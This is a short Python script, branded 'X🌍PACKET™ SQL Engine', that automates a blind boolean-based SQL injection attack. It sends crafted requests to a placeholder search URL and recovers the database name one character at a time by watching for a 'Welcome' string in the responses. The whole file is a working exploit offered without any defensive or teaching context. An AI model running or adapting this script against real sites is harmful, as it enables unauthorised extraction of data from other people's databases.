import requests

def extract_db(url, payload):
    print(f"[*] X🌍PACKET™ SQL Engine: Extracting from {url}")
    # Real-world blind SQL logic
    chars = "abcdefghijklmnopqrstuvwxyz0123456789_-"
    extracted_data = ""
    for i in range(1, 20): # ആദ്യത്തെ 20 അക്ഷരങ്ങൾ
        for char in chars:
            full_payload = payload.format(i, char)
            r = requests.get(url + full_payload)
            if "Welcome" in r.text: # Success message condition
                extracted_data += char
                print(f"[+] Found: {extracted_data}")
                break
    return extracted_data

if __name__ == "__main__":
    target_url = "http://target.com/search?id="
    # Blind SQL payload
    blind_payload = "1' AND (SELECT SUBSTRING(database(),{},1))='{}'--"
    extract_db(target_url, blind_payload)
